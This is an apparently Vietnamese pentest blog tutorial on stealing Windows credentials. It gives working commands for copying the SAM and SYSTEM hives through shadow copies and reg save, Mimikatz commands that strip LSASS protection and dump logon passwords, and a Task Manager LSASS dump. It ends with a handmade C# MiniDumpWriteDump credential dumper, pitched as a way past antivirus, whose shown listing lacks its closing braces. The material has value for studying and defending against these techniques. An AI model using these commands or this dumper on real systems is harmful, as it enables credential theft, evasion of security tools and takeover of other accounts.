![](https://images.viblo.asia/b5085508-17d2-404f-8b72-319ffdb7d889.jpg)

Dump Credentials có lẽ là công việc yêu thích nhất của mọi Pentester trong quá trình Red Team. Bởi đơn giản nó là thành quả sau quá trình RCE và leo thang đặc quyền đầy khó khăn vất vả.  Tuy nhiên để dump credentials sao cho đúng cách , chính xác và đầy đủ cũng không phải  dễ dàng gì.  Trong bài viết này, chúng ta cùng nhau tìm hiểu về các cơ chế xác thực của Windows trong  hai môi trường : Local và Active Directory , đồng thời cách lợi dụng chúng để lấy thông tin cần thiết. 

# 1. Local Windows Credentials

Local Windows credentials được lưu trữ trong Security Account Manager (SAM) dưới dạng NTLM hash (được base trên MD4).  Cái hay là chúng ta có thể "tái sử dụng" lại các hash này để xác thực cho một máy khác , miễn là hash đó được liên kết với tài khoản người dùng và mật khẩu đã đăng ký trên máy đó. Mặc dù thông tin đăng nhập local trùng khớp giữa các máy tính khác nhau là khó xảy ra.

> Tài khoản `administrator` có tên mặc định được cài đặt trên tất cả các máy chạy Windows, tuy nhiên từ version Windows VISA , tài khoản này đã bị disable theo mặc định.

Mọi tài khoản Windows đều có một Security Identifier (SID)  duy nhất tuân theo format sau:

```
S-R-I-S
```

* S là dấu hiệu nhận dạng SID
* R là revison level (thường là 1)
* I giá trị định danh quyền hạn (thường là 5)

Còn lại là các giá trị phụ. Trong đó có giá trị cuối RID - administrator local account (thường có giá trị là 500)

Chúng ta có thể sử dụng Powershell và WMI để tìm kiếm SID của Administrator local trên máy Windows 10

```
$env:computername // xác định tên computer
[wmi] "Win32_userAccount.Domain='client',Name='Administrator'"  // lấy thông tin tài khoản admin
```

[![tyeScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/tyeScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/tyeScreenshot_1.png)

Ở đây ta thấy giá trị **`S-1-5-21-1673717583-1524682655-2710527411-500`**

Tiếp theo, chúng ta thử cố gắng lấy thông tin đăng nhập cho tài khoản này từ file SAM ( được đặt tại C:\\Windows\System32\config\SAM)

[![qiqScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/qiqScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/qiqScreenshot_3.png)

Quá trình  thất bại do SYSTEM Process đã lock nó lại, ngăn cản chúng ta can thiệp vào file ngay cả khi chúng ta đang sử dụng vai trò Administrator. Về mặt lý thuyết, chúng ta chỉ có thể đọc nó khi SYSTEM process không hoạt động - tức là chỉ có thể đọc khi máy tính không bật. (Điều này là bất khả thi).

Tuy nhiên, chúng ta vẫn có thể đọc SAM theo một cách đơn giản hơn, là "snapshot" toàn bộ ổ C , sau đó mở file SAM trong đó ra 

Sử dụng ``wmic`` để làm điều này

```powershell 
wmic shadowcopy call create Volume='C:\`
```

[![25fScreenshot_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/25fScreenshot_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/25fScreenshot_4.png)

Sử dụng `vssadmin` để list shadow volumes


[![LL9Screenshot_6.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/LL9Screenshot_6.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/LL9Screenshot_6.png)

Bây giờ ta có thể copy file SAM từ snapshot ra ngoài 

(Lưu ý: lệnh này phải dùng CMD, Powershell sẽ không chạy)

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\namnt.corp1\Downloads\sam
```

[![8PdScreenshot_7.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/8PdScreenshot_7.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/8PdScreenshot_7.png)

Tuy rằng ta đã có SAM databases, nhưng nội dung này đã được mã hóa bằng RC4 hoặc AES. Encryption keys được lưu trữ ở thư mục SAM trong SYSTEM file - cũng được đã lock bởi SYSTEM account.

## 1.1. Trích xuất từ Windows Registry

Để lấy credentials từ SAM chúng ta có thể gọi vào system file ở registry **HKLM\sam** và **HKLM\system** như sau : 

Copy system file từ snapshot

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\namnt.corp1\Downloads\system
```

```
reg save HKLM\sam C:\users\namnt.corp1\Downloads\sam
reg save HKLM\system C:\users\namnt.corp1\Downloads\system
```

Sau đó copy file SAM về máy

> Nếu đã Remote Desktop thì ta chỉ cần click chuột vào mục COPY và PASTE về máy. Cực tiện !!!

Tiến hành giải mã trên máy Kali Linux với **creddump7**

[![J8aScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/J8aScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/J8aScreenshot_1.png)

Cách này hữu hiệu khi chúng ta thực hiện DUMP file theo cách hợp pháp, tránh được các phần mềm diệt Virus

## 1.2. Trích xuất với Hashdump 
    
Có nhiều phương pháp tự động mà ta có thể sử dụng để DUMP Hash admin như **Mimikatz** hay **Meterpreter** . Điểm yếu chúng của cách này là phần mềm diệt virus thường chặn và tiêu diệt chúng ngay từ cái nhìn đầu tiên - khiến ta cần thêm phương pháp bypass cho hợp lý.
 
Sử dụng "hashdump" trên meterpreter để trích xuất hash password 
  
[![aCOScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/aCOScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/aCOScreenshot_2.png)
  
Mặc dù việc vô hiệu hóa tài khoản administrator sẽ làm cuộc tấn công này không thực hiện được, nhưng do trên thực tế nhiều tổ chức doanh nghiệp dựa vào nó để triển khai cho các tác vụ và ứng dụng khác nhau nên điều này khá khó áp dụng.
  
**Cách giải quyết vấn đề của Microsoft ?**
 
Trong nỗ lực ngăn chặn cuộc tấn công, Microsoft đã giới thiệu tính năng  **Group Policy Preferences** với Windows Server 2008. Bao gồm việc thay đổi mật khẩu Admin local một cách tập trung. Tuy nhiên, phương pháp này lại lưu trữ dữ liệu dưới dạng XML trong thư mục SYSVOL và tất cả các máy tính trong Active Directory đều phải truy cập được . Để "che mắt" Microsoft mã hóa chúng ở dạng AES-256

  ```xml
<?xml version="1.0" encoding="utf-8" ?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D224D26}">
	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="2" changed="2015-05-22 05:01:55" uid="{D5FE7352-81E1-42A2-B7DA-118402BE4C33}">
		<Properties action="U" newName="ADSAdmin" fullName="" description"" cpassword="RI133B2WI2CiIOCau1DtrtTe3wdFwzCiWB5PSAxXMDstchJt3bLOUie0BaZ/7rdQjuqTonF3ZWAKa1iRvd4JGQ" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (built-in)" expires="2015-05-21" />
	</User>
</Groups>  
```
Thực tế thì điều này là khá an toàn, cho tới khi Microsoft công bố AES private key trên trang web chính thức của mình 😬.

# 2. Active Directory - Credentials
    
## 2.1. Xác thực Kerberos Active Directory

    
![](https://images.viblo.asia/718906a9-827a-4e65-9a11-cf7b01c88811.jpg)


**KDC bao gồm:**

- Ticket-granting server (TGS)
- Authentication server (AS)
- Kerberos database that stores the password and identification of all verified users 
--------------- 
Quá trình xác thực Kerberos diễn ra như sau : 
  
**Step 1**: Người dùng chia sẻ username - password - Domain name cho client
  
**Step 2**: Client tập hợp một gói bao gồm (username, time, hour) 
  
**Step 3**: Client gửi gói tin cho KDC

**Step 4**: KDC nhận được gói tin. Dựa vào username để tìm kiếm mật khẩu client. Sau đó giải mã gói tin với mật khẩu đó. Nếu thành công - danh tính người dùng được xác minh (*AS -> Kerberos Database*)

**Step 5**: Khi danh tính được xác minh, KDC (TGS) sẽ tạo 1 Ticket và gửi lại cho client (mã hóa)

**Step 6**: Ticket sau khi nhận được lưu trữ trong Kerberos tray của client và được sử dụng để truy cập vào Server trong 1 thời gian nhất định (thường là 8 tiếng)

**Step 7**. Nếu Client cần truy cập vào một Server khác, nó sẽ gửi ticket gốc tới KDC + Yêu cầu truy cập tài nguyên mới

**Step 8**. KDC giải mã ticket bằng key của nó
 
>Khách hàng không cần phải  xác thực lại vì KDC có thể dựa vào tấm vé để xác minh người dùng trước đó

**Step 9**. KDC tạo 1 ticket update để khách hàng truy cập tài nguyên mới (*Ticket này cũng được mã hóa bằng key của KDC*)

**Step 10**. Client lưu ticket vào Kerberos tray và gửi bản sao tới Server cần xác thực

**Step 11**. Server sử dụng mật khẩu riêng của mình để giải mã vé. Sau đó kiểm tra ACL để cấp quyền

## 2.1. Dump thông tin với Mimikatz 

Trong nội dung này, chúng ta sẽ cùng nhau thảo luận về cách trích xuất thông tin xác thực từ memory trong Kerberos protocol. Đồng thời chúng ta sẽ tìm hiểu về **Local Security Authority** và cách bypass nó 
  
Do mô hình Kerberos tự động gia hạn TGT, các hàm băm mật khẩu sẽ được lưu vào bộ nhớ đệm trong *Local Security Authority Subsystem Service (LSASS)* memory space. Nếu chúng ta có quyền truy cập vào các hàm băm này, chúng ta có thể bẻ khóa chúng để lấy mật khẩu dạng bản rõ, hay đơn giản hơn là thực hiện một cuộc tấn công **Pass-the-hash**
  
> Vì LSASS là một phần của hệ điều hành và chạy dưới dạng SYSTEM, nên chúng ta cần quyền SYSTEM hoặc (local Admin) để có quyền truy cập vào hash password trên một mục tiêu.

Mimikatz được viết bởi Benjamin Delpy là một công cụ mạnh mẽ mà chúng ta có thể sử dụng để trích xuất thông tin đăng nhập, tokens và leo thang đặc quyền windows. 
  
Với đặc quyền Administrator, user có thể sử dụng  **SeDebugPrivilege** để read và modify process nằm dưới quyền sở hữu của user khác. Để làm điều này,chúng ta sử dụng **privilege::debug** 
  
[![Iy6Screenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/Iy6Screenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/Iy6Screenshot_1.png)  

Kể từ năm 2012,Microsoft đã phát triển các kỹ năng giảm thiểm LSA Protection và Windows Defender Credential Guard để ngăn chặn việc can thiệp vào LSA

Với LSA đã được bảo vệ, ta không thể DUMP trực tiếp như cũ. Nếu cố tình thực hiện,thông báo lỗi sẽ trả về như sau

[![aWBScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/aWBScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/aWBScreenshot_2.png)
  
Để tiến hành DUMP dữ liệu, chúng ta cần load thư viện **mimidrv.sys** trước, sau đó tắt chế độ bảo vệ của Lsass

```powershell 
mimikatz# !+
mimikatz# !processprotect /process:lsass.exe /remove
mimikatz# sekurlsa::logonpasswords
```
    
[![u4nScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/u4nScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/u4nScreenshot_3.png)  

## 2.2. Dump thông tin với Task Manager 

Mimikatz đa phần rất khó sử dụng trong môi trường thực tế, vì nó bị chặn bởi tất các phần mềm diệt Virus cơ bản nhất. Để việc dump process credentials tỏ ra hiệu quả hơn thì chúng ta phải sử dụng nhiều phương pháp khác nhau, trong đó có việc lợi dụng Task Manager 
  
Mở Task Manager > Kích chuột phải vài lsass.exe > Create dump file 
  
[![112-1126712_microsoft-powershell-microsoft-powershell-logo-png.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/112-1126712_microsoft-powershell-microsoft-powershell-logo-png.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/112-1126712_microsoft-powershell-microsoft-powershell-logo-png.png)

[![6PFScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/6PFScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/6PFScreenshot_1.png)
  
Download về máy local rồi tiến hành phân tích với Mimikatz 
  
> Môi trường của Hacker phải trùng với môi trường của nạn nhân 64bit - 64 bit , 32bit - 32bit

```
mimikatz.exe
sekurlsa::minidump lsass.dmp //file dump từ victim
sekurlsa::logonpasswords
 ``` 
  
[![8DtScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/8DtScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/8DtScreenshot_1.png)

Tuy nhiên Task Manager là ứng dụng chỉ hoạt động với giao diện đồ họa. Do đó trong trường hợp tấn công, chúng ta buộc phải RDP vào máy nạn nhân. Điều này là khá khó khăn trong thực tế
    
 ProcDump  cũng có thể làm điều tương tự, tuy nhiên cũng như Mimikatz nó bị đánh dấu là phần mềm độc hại. Cho nên chúng ta sẽ handmade một phần mềm dump credential riêng.
  
## 2.3. Dump thông tin với Windows API 

**MimiDumpWireDump API**
  
Khi TaskManager và Procdump extract thông tin LSASS chúng  gọi API Win32 **MiniDumpWriteDump** . Chúng ta cũng có thể bắt chước để sử dụng lại API này 

tra cứ trên MSDN về API syntax

 ```csharp 
  BOOL MiniDumpWriteDump(
  [in] HANDLE                            hProcess,
  [in] DWORD                             ProcessId,
  [in] HANDLE                            hFile,
  [in] MINIDUMP_TYPE                     DumpType,
  [in] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
  [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
  [in] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);
  ```
 
  Hàm này yêu cầu rất nhiều đối số, nhưng ta chỉ cần quan tâm 4 đối số đầu tiên trong trường hợp này. 
  * hProcess, ProcessID liên quan tới Process và ID của LSASS
  * hFile  là một handle file chứa thông tin đã trích xuất
  * DumpType định nghĩa enumeration type. Chúng ta đặt thành **MiniDumpWithFullMemory (2)** để lấy full thông tin 
  
  
Trước tiên chúng ta import DLL API cần gọi

  ```csharp
  [DllImport("Dbghelp.dll")]
static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, ref MINIDUMP_EXCEPTION_INFORMATION ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
  ```
Để lấy ID process, chúng ta có thể sử dụng `GetProcessesByName` của class Process, và chọn thuộc tính ID

```csharp
  Process[] lsass = Process.GetProcessesByName("lsass");
int lsass_pid = lsass[0].Id;
  ```
>Phải include System.Diagnostics để sử dụng class Process  

  Tiếp theo, chúng ta sẽ OpenProcess() LSASS 
 
DLL import
  
```csharp 
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, 
          int processId);  
```
  
```csharp
  IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
```
Tiêp theo. chúng ta sẽ xử lý 2 tham số của   `MiniDumpWriteDump` với  FileStream  Object (output chỗ dữ liệu vừa dump được)
  
```csharp
FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);  
```
Chúng ta phải covert đối số `dumpFile ` sang kiểu C với phương thức `DangerousGetHandle9` thuộc SafeHandle class
  
```csharp
// Giá trị hFile  
dumpFile.SafeFileHandle.DangerousGetHandle()  
```  
  
Chương trình cuối cùng sẽ như sau :   
  
  ```csharp 
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace MiniDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, 
          IntPtr hFile, int DumpType, IntPtr ExceptionParam, 
          IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, 
          int processId);

        static void Main(string[] args)
        {
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
```
Biên dịch và thực thi chương trình, ta nhận được toàn bộ thông tin mục tiêu nằm trong `C:\\Windows\\tasks\\lsass.dmp`